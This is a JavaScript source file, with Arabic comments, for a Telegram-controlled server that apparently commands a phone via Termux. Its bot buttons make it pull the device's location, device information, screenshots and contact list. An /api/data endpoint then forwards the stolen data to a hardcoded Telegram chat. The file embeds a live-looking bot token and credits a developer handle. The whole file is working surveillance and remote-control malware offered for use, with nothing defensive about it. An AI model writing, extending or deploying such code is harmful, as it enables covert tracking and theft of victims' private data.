const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const token = '8976550250:AAHR7uKjBNzlHgoiBxierxbknbCdrtM_YcQ';
const chatId = '8737619314'; 
const bot = new TelegramBot(token, { polling: true });

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.json());

// الأزرار
const mainKeyboard = { reply_markup: { keyboard: [
    [{ text: '📍 الموقع' }, { text: '📱 معلومات الجهاز' }],
    [{ text: '📸 لقطة شاشة' }, { text: '📇 جهات الاتصال' }],
    [{ text: '⌖ عن لنا' }]
], resize_keyboard: true } };

bot.onText(/\/start/, (msg) => bot.sendMessage(msg.chat.id, '⌖ اختر من القائمة:', mainKeyboard));

bot.on('message', (msg) => {
    const text = msg.text;
    if (!text || text === '/start') return;
    if (text === '⌖ عن لنا') return bot.sendMessage(chatId, '⌖ المطور: @king_1_4');

    // إرسال الأمر للترماكس (بالإنجليزي عشان الترماكس يفهمها)
    if (text === '📍 الموقع') {
        io.emit('command', { action: 'loc' });
        bot.sendMessage(chatId, '⏳ جاري طلب الموقع...');
        return;
    }
    
    if (text === '📱 معلومات الجهاز') {
        io.emit('command', { action: 'info' });
        bot.sendMessage(chatId, '⏳ جاري طلب معلومات الجهاز...');
        return;
    }
    
    if (text === '📸 لقطة شاشة') {
        io.emit('command', { action: 'shot' });
        bot.sendMessage(chatId, '⏳ جاري التقاط الشاشة...');
        return;
    }
    
    if (text === '📇 جهات الاتصال') {
        io.emit('command', { action: 'contacts' });
        bot.sendMessage(chatId, '⏳ جاري سحب جهات الاتصال...');
        return;
    }
});

// استقبال البيانات من الترماكس
app.post('/api/data', (req, res) => {
    const data = req.body;
    if (!data) return res.status(400).send('No data');
    
    if (data.type === 'location') {
        const mapUrl = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
        bot.sendPhoto(chatId, `https://maps.googleapis.com/maps/api/staticmap?center=${data.lat},${data.lon}&zoom=15&size=600x300&markers=color:red%7C${data.lat},${data.lon}`, { caption: `📍 الموقع:\n${mapUrl}` });
    } else if (data.type === 'contacts') {
        bot.sendMessage(chatId, `✅ جهات الاتصال:\n${data.content.substring(0, 4000)}`);
    } else if (data.type === 'deviceinfo') {
        bot.sendMessage(chatId, `📱 معلومات الجهاز:\n${data.content}`);
    } else if (data.type === 'screenshot') {
        const buffer = Buffer.from(data.content, 'base64');
        bot.sendPhoto(chatId, buffer, { caption: '📸 لقطة شاشة' });
    }
    res.send('OK');
});

// السيرفر
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`[Server] Listening on port ${PORT}`));
